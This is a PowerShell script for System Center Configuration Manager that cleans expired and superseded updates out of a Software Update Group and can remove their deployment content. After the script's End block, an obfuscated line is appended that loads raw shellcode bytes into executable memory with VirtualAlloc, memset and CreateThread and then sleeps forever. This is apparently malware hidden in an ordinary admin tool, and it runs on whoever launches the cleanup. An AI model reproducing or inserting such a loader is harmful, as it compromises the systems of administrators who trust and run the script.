
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true,HelpMessage="Site server where the SMS Provider is installed")]
    [ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})]
    [string]$SiteServer,
    [parameter(Mandatory=$true,HelpMessage="Name of the Software Update Group")]
    [string]$SUGName,
    [parameter(Mandatory=$false,HelpMessage="Only remove expired Software Updates. This includes updates that are both expired and superseded. It does, however, exclude updates that are superseded but not expired")]
    [switch]$ExpiredOnly,
    [parameter(Mandatory=$false,HelpMessage="Remove the content for those Software Updates that will be removed from a Software Upgrade Group")]
    [switch]$RemoveContent,
    [parameter(Mandatory=$false,HelpMessage="Show a progressbar displaying the current operation")]
    [switch]$ShowProgress
)
Begin {
    
    try {
        Write-Verbose "Determining SiteCode for Site Server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Debug "SiteCode: $($SiteCode)"
            }
        }
    }
    catch [Exception] {
        Throw "Unable to determine SiteCode"
    }
}
Process {
    try {
        
        if (($SUGName.StartsWith("*")) -and ($SUGName.EndsWith("*"))) {
            Write-Verbose -Message "Query: SELECT * FROM SMS_AuthorizationList WHERE LocalizedDisplayName like '%$($SUGName.Replace('*',''))%'"
            $WmiFilter = "LocalizedDisplayName like '%$($SUGName)%'"
        }
        elseif ($SUGName.StartsWith("*")) {
            Write-Verbose -Message "Query: SELECT * FROM SMS_AuthorizationList WHERE LocalizedDisplayName like '%$($SUGName.Replace('*',''))'"
            $WmiFilter = "LocalizedDisplayName like '%$($SUGName)'"
        }
        elseif ($SUGName.EndsWith("*")) {
            Write-Verbose -Message "Query: SELECT * FROM SMS_AuthorizationList WHERE LocalizedDisplayName like '$($SUGName.Replace('*',''))%'"
            $WmiFilter = "LocalizedDisplayName like '$($SUGName)%'"
        }
        else {
            Write-Verbose -Message "Query: SELECT * FROM SMS_AuthorizationList WHERE LocalizedDisplayName like '$($SUGName)'"
            $WmiFilter = "LocalizedDisplayName like '$($SUGName)'"
        }
        if ($SUGName -match "\*") {
            $SUGName = $SUGName.Replace("*","")
            $WmiFilter = $WmiFilter.Replace("*","")
        }
        $SUGResults = (Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_AuthorizationList -ComputerName $SiteServer -Filter "$($WmiFilter)" -ErrorAction SilentlyContinue | Measure-Object).Count
        if ($SUGResults -eq 1) {
            $AuthorizationList = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_AuthorizationList -ComputerName $SiteServer -Filter "$($WmiFilter)" -ErrorAction Stop
            $AuthorizationList = [wmi]"$($AuthorizationList.__PATH)"
            $UpdatesCount = $AuthorizationList.Updates.Count
            $UpdatesList = New-Object -TypeName System.Collections.ArrayList
            $RemovedUpdatesList = New-Object -TypeName System.Collections.ArrayList
            if ($PSBoundParameters["ShowProgress"]) {
                $ProgressCount = 0
            }
            foreach ($Update in ($AuthorizationList.Updates)) {
                $CIID = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_SoftwareUpdate -ComputerName $SiteServer -Filter "CI_ID = '$($Update)'" -ErrorAction Stop
                if ($PSBoundParameters["ShowProgress"]) {
                    $ProgressCount++
                    Write-Progress -Activity "Processing Software Updates in '$($SUGName)'" -Id 1 -Status "$($ProgressCount) / $($UpdatesCount)" -CurrentOperation "$($CIID.LocalizedDisplayName)" -PercentComplete (($ProgressCount / $UpdatesCount) * 100)
                }
                if ($CIID.IsExpired -eq $true) {
                    Write-Verbose -Message "Update '$($CIID.LocalizedDisplayName)' was expired and will be removed from '$($AuthorizationList.LocalizedDisplayName)'"
                    if ($CIID.CI_ID -notin $RemovedUpdatesList) {
                        $RemovedUpdatesList.Add($CIID.CI_ID) | Out-Null
                    }
                }
                elseif (($CIID.IsSuperseded -eq $true) -and (-not($PSBoundParameters["ExpiredOnly"]))) {
                    Write-Verbose -Message "Update '$($CIID.LocalizedDisplayName)' was superseded and will be removed from '$($AuthorizationList.LocalizedDisplayName)'"
                    if ($CIID.CI_ID -notin $RemovedUpdatesList) {
                        $RemovedUpdatesList.Add($CIID.CI_ID) | Out-Null
                    }
                }
                else {
                    if ($CIID.CI_ID -notin $UpdatesList) {
                        $UpdatesList.Add($CIID.CI_ID) | Out-Null
                    }
                }
            }
            
            if ($UpdatesCount -gt $UpdatesList.Count) {
                try {
                    if ($PSCmdlet.ShouldProcess("$($AuthorizationList.LocalizedDisplayName)","Clean '$($UpdatesCount - ($UpdatesList.Count))' updates")) {
                        if ($UpdatesList.Count -ge 1) {
                            $AuthorizationList.Updates = $UpdatesList
                            $AuthorizationList.Put() | Out-Null
                            Write-Verbose -Message "Successfully cleaned up $($UpdatesCount - ($UpdatesList.Count)) updates from '$($AuthorizationList.LocalizedDisplayName)'"
                        }
                        else {
                            $AuthorizationList.Updates = @()
                            $AuthorizationList.Put() | Out-Null
                            Write-Verbose -Message "Successfully cleaned up all updates from '$($AuthorizationList.LocalizedDisplayName)'"
                        }
                    }
                    
                    if ($PSBoundParameters["RemoveContent"]) {
                        try {
                            $DeploymentPackageList = New-Object -TypeName System.Collections.ArrayList
                            foreach ($CI_ID in $RemovedUpdatesList) {
                                Write-Verbose -Message "Collecting content data for CI_ID: $($CI_ID)"
                                $ContentData = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Query "SELECT SMS_PackageToContent.ContentID,SMS_PackageToContent.PackageID from SMS_PackageToContent JOIN SMS_CIToContent on SMS_CIToContent.ContentID = SMS_PackageToContent.ContentID where SMS_CIToContent.CI_ID in ($($CI_ID))" -ComputerName $SiteServer -ErrorAction Stop
                                Write-Verbose -Message "Found '$(($ContentData | Measure-Object).Count)' objects"
                                foreach ($Content in $ContentData) {
                                    $ContentID = $Content | Select-Object -ExpandProperty ContentID
                                    $PackageID = $Content | Select-Object -ExpandProperty PackageID
                                    $DeploymentPackage = [wmi]"\\$($SiteServer)\root\SMS\site_$($SiteCode):SMS_SoftwareUpdatesPackage.PackageID='$($PackageID)'"
                                    if ($DeploymentPackage.PackageID -notin $DeploymentPackageList) {
                                        $DeploymentPackageList.Add($DeploymentPackage.PackageID) | Out-Null
                                    }
                                    if ($PSCmdlet.ShouldProcess("$($PackageID)","Remove ContentID '$($ContentID)'")) {
                                        Write-Verbose -Message "Attempting to remove ContentID '$($ContentID)' from PackageID '$($PackageID)'"
                                        $ReturnValue = $DeploymentPackage.RemoveContent($ContentID, $false)
                                        if ($ReturnValue.ReturnValue -eq 0) {
                                            Write-Verbose -Message "Successfully removed ContentID '$($ContentID)' from PackageID '$($PackageID)'"
                                        }
                                    }
                                }
                            }
                            
                            foreach ($DPackageID in $DeploymentPackageList) {
                                if ($PSCmdlet.ShouldProcess("$($DPackageID)","Refresh content source")) {
                                    $DPackage = [wmi]"\\$($SiteServer)\root\SMS\site_$($SiteCode):SMS_SoftwareUpdatesPackage.PackageID='$($DPackageID)'"
                                    Write-Verbose -Message "Attempting to refresh content source for Deployment Package '$($DPackage.Name)'"
                                    $ReturnValue = $DPackage.RefreshPkgSource()
                                    if ($ReturnValue.ReturnValue -eq 0) {
                                        Write-Verbose -Message "Successfully refreshed content source for Deployment Package '$($DPackage.Name)'"
                                    }
                                }
                            }
                        }
                        catch [Exception] {
                            Write-Warning -Message "An error occured when attempting to remove ContentID '$($ContentID)' from '$($PackageID)'"
                        }
                    }
                }
                catch [Exception] {
                    Write-Warning -Message "Unable to save changes to '$($AuthorizationList.LocalizedDisplayName)'" ; break
                }
            }
            else {
                Write-Verbose -Message "No changes detected, will not update '$($AuthorizationList.LocalizedDisplayName)'"
            }
        }
        elseif ($SUGResults -ge 1) {
            Write-Warning -Message "Specified Software Update Group name returned '$($SUGResults)' results, please be more specific"
        }
        else {
            Write-Warning -Message "Unable to locate a Software Update Group named '$($SUGName)'"
        }
    }
    catch [Exception] {
        Throw $_.Exception.Message
    }
}
End {
    if ($PSBoundParameters["ShowProgress"]) {
        Write-Progress -Activity "Enumerating Software Updates" -Completed -ErrorAction SilentlyContinue
    }
}
$LCPw = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $LCPw -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc1,0xbe,0x91,0x21,0xd8,0x0f,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x75,0x14,0x03,0x75,0x85,0xc3,0x2d,0xf3,0x4d,0x81,0xce,0x0c,0x8d,0xe6,0x47,0xe9,0xbc,0x26,0x33,0x79,0xee,0x96,0x37,0x2f,0x02,0x5c,0x15,0xc4,0x91,0x10,0xb2,0xeb,0x12,0x9e,0xe4,0xc2,0xa3,0xb3,0xd5,0x45,0x27,0xce,0x09,0xa6,0x16,0x01,0x5c,0xa7,0x5f,0x7c,0xad,0xf5,0x08,0x0a,0x00,0xea,0x3d,0x46,0x99,0x81,0x0d,0x46,0x99,0x76,0xc5,0x69,0x88,0x28,0x5e,0x30,0x0a,0xca,0xb3,0x48,0x03,0xd4,0xd0,0x75,0xdd,0x6f,0x22,0x01,0xdc,0xb9,0x7b,0xea,0x73,0x84,0xb4,0x19,0x8d,0xc0,0x72,0xc2,0xf8,0x38,0x81,0x7f,0xfb,0xfe,0xf8,0x5b,0x8e,0xe4,0x5a,0x2f,0x28,0xc1,0x5b,0xfc,0xaf,0x82,0x57,0x49,0xbb,0xcd,0x7b,0x4c,0x68,0x66,0x87,0xc5,0x8f,0xa9,0x0e,0x9d,0xab,0x6d,0x4b,0x45,0xd5,0x34,0x31,0x28,0xea,0x27,0x9a,0x95,0x4e,0x23,0x36,0xc1,0xe2,0x6e,0x5e,0x26,0xcf,0x90,0x9e,0x20,0x58,0xe2,0xac,0xef,0xf2,0x6c,0x9c,0x78,0xdd,0x6b,0xe3,0x52,0x99,0xe4,0x1a,0x5d,0xda,0x2d,0xd8,0x09,0x8a,0x45,0xc9,0x31,0x41,0x96,0xf6,0xe7,0xfc,0x93,0x60,0xc8,0xa9,0x9d,0x73,0xa0,0xab,0x9d,0x72,0x8c,0x25,0x7b,0x24,0xbc,0x65,0xd4,0x84,0x6c,0xc6,0x84,0x6c,0x67,0xc9,0xfb,0x8c,0x88,0x03,0x94,0x26,0x67,0xfa,0xcc,0xde,0x1e,0xa7,0x87,0x7f,0xde,0x7d,0xe2,0xbf,0x54,0x72,0x12,0x71,0x9d,0xff,0x00,0xe5,0x6d,0x4a,0x7a,0xa3,0x72,0x60,0x11,0x4b,0xe7,0x8f,0xb0,0x1c,0x9f,0x8d,0xe5,0x6a,0x00,0x6d,0xc0,0xe1,0x89,0xfb,0xab,0x9d,0xf5,0xeb,0x2b,0x5d,0xa0,0x61,0x2c,0x35,0x14,0xd2,0x7f,0x20,0x5b,0xcf,0x13,0xf9,0xce,0xf0,0x45,0xae,0x59,0x99,0x6b,0x89,0xae,0x06,0x93,0xfc,0x2e,0x7a,0x42,0x38,0x45,0x92,0x56;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$AIjr=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($AIjr.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$AIjr,0,0,0);for (;;){Start-sleep 60};

